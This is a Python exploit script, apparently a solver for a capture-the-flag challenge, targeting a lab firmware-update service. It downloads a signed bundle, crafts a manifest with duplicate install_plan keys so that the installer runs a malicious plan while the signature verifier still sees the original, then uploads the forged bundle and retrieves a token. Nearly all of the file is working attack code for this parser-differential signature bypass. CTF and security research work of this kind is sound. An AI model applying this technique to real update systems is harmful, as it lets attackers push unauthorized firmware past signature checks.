#!/usr/bin/env python3
"""
Token 2 solver (Ocean's 0x0D)

- Downloads firmware
- Creates new bundle
- Modifies it to use the duplicate manfiest technique
- Submits it to recover token 2
"""

import io
import json
import tarfile
import time
import requests

VAULTCORE_BASE = "http://vaultcore.pccc:8080"
TIMEOUT = 90  # upload can be slow; don't use 30s

def die(msg):
    raise SystemExit(msg)

def get_release_id():
    r = requests.get(f"{VAULTCORE_BASE}/api/fw/catalog", timeout=TIMEOUT)
    r.raise_for_status()
    releases = r.json().get("releases", [])
    if not releases:
        die("[!] No releases in catalog")
    rid = releases[0]["id"]
    print(f"[*] Using release_id: {rid}")
    return rid

def download_bundle(rid: str) -> bytes:
    url = f"{VAULTCORE_BASE}/api/fw/download/{rid}"
    r = requests.get(url, timeout=TIMEOUT)
    r.raise_for_status()
    data = r.content
    print(f"[*] Downloaded firmware bundle: {len(data)} bytes")
    return data

def extract_bundle(bundle_bytes: bytes):
    manifest_bytes = None
    payload_bytes = None
    sig_bytes = None

    with tarfile.open(fileobj=io.BytesIO(bundle_bytes), mode="r:*") as tf:
        for m in tf.getmembers():
            if m.name == "manifest.json":
                manifest_bytes = tf.extractfile(m).read()
            elif m.name == "payload.bin":
                payload_bytes = tf.extractfile(m).read()
            elif m.name == "sig.bin":
                sig_bytes = tf.extractfile(m).read()

    if manifest_bytes is None or payload_bytes is None or sig_bytes is None:
        die("[!] Bundle missing one of: manifest.json payload.bin sig.bin")

    print("[*] Extracted manifest.json, payload.bin, sig.bin")
    return manifest_bytes, payload_bytes, sig_bytes

def make_duplicate_key_manifest(original_manifest_bytes: bytes) -> bytes:
    """
    Build a manifest.json that contains TWO install_plan keys:
      - FIRST: malicious blueprint plan (installer sees this)
      - LAST : original install_plan (verifier sees this; signature stays valid)
    """
    original = json.loads(original_manifest_bytes.decode("utf-8"))
    if "install_plan" not in original:
        die("[!] Original manifest missing install_plan")

    original_plan = original["install_plan"]

    # Malicious plan: must satisfy installer checks:
    # saw_install + bp_enabled + mode=="blueprint"
    malicious_plan = [
        {"op": "install", "path": "/opt/vault/fw/payload.bin"},
        {"op": "enable_blueprint"},
        {"op": "set_mode", "value": "blueprint"},
    ]

    # Build JSON manually to preserve duplicate keys.
    # Verifier uses json.loads -> last install_plan wins -> original_plan.
    # Installer uses first-key parser -> first install_plan wins -> malicious_plan.
    other_keys = {k: v for k, v in original.items() if k != "install_plan"}

    # Keep it compact; whitespace irrelevant.
    def j(x): return json.dumps(x, separators=(",", ":"), ensure_ascii=False)

    parts = []
    parts.append("{")
    parts.append(f"\"install_plan\":{j(malicious_plan)},")

    # include all other keys exactly once
    # order doesn't matter for verifier canonicalization (it sorts keys anyway)
    for i, (k, v) in enumerate(other_keys.items()):
        parts.append(f"\"{k}\":{j(v)},")
    # final duplicate key must be last and match original plan exactly
    parts.append(f"\"install_plan\":{j(original_plan)}")
    parts.append("}")

    out = "".join(parts).encode("utf-8")

    # Sanity: verifier parse must equal original dict (last wins -> original install_plan)
    verifier_view = json.loads(out.decode("utf-8"))
    if verifier_view != original:
        die("[!] Sanity failed: verifier_view != original (signature would break)")

    print("[*] Built duplicate-key manifest (install_plan x2) while preserving verifier view")
    return out

def repack_bundle(manifest_bytes: bytes, payload_bytes: bytes, sig_bytes: bytes) -> bytes:
    bio = io.BytesIO()
    with tarfile.open(fileobj=bio, mode="w") as tf:
        def add(name: str, b: bytes):
            ti = tarfile.TarInfo(name=name)
            ti.size = len(b)
            ti.mtime = int(time.time())
            tf.addfile(ti, io.BytesIO(b))

        add("manifest.json", manifest_bytes)
        add("payload.bin", payload_bytes)
        add("sig.bin", sig_bytes)

    data = bio.getvalue()
    print(f"[*] Repacked modified bundle: {len(data)} bytes")
    return data

def write_file(fname: str, data: bytes):
    with open(fname, "wb") as f:
        f.write(data)
    print(f"[*] Wrote: {fname}")

def upload_bundle(bundle_bytes: bytes):
    url = f"{VAULTCORE_BASE}/api/fw/upload"
    files = {"file": ("vault-fw-evil.tar", bundle_bytes, "application/x-tar")}
    r = requests.post(url, files=files, timeout=TIMEOUT)
    print(f"[*] Upload status: {r.status_code}")
    try:
        print(json.dumps(r.json(), indent=2))
    except Exception:
        print(r.text)
    return r

def fetch_blueprint_slip():
    url = f"{VAULTCORE_BASE}/api/ops/maintenance/blueprint-slip"
    r = requests.get(url, timeout=TIMEOUT)
    print(f"[*] Slip status: {r.status_code}")
    try:
        print(json.dumps(r.json(), indent=2))
    except Exception:
        print(r.text)
    return r

def main():
    print(f"[*] VAULTCORE_BASE = {VAULTCORE_BASE}")
    rid = get_release_id()

    bundle = download_bundle(rid)
    manifest_b, payload_b, sig_b = extract_bundle(bundle)

    original = json.loads(manifest_b.decode("utf-8"))
    print(f"[*] Manifest version: {original.get('version')}")

    evil_manifest = make_duplicate_key_manifest(manifest_b)
    evil_bundle = repack_bundle(evil_manifest, payload_b, sig_b)

    out_name = f"fw_blueprint_{rid}.tar"
    write_file(out_name, evil_bundle)

    # Upload it back
    resp = upload_bundle(evil_bundle)
    if resp.status_code >= 500:
        die("[!] Server error on upload")
    if resp.status_code != 200:
        die("[!] Upload failed")

    # If blueprint worked, token2_found will be set; slip endpoint should return token (depending on reveal rules)
    fetch_blueprint_slip()

if __name__ == "__main__":
    main()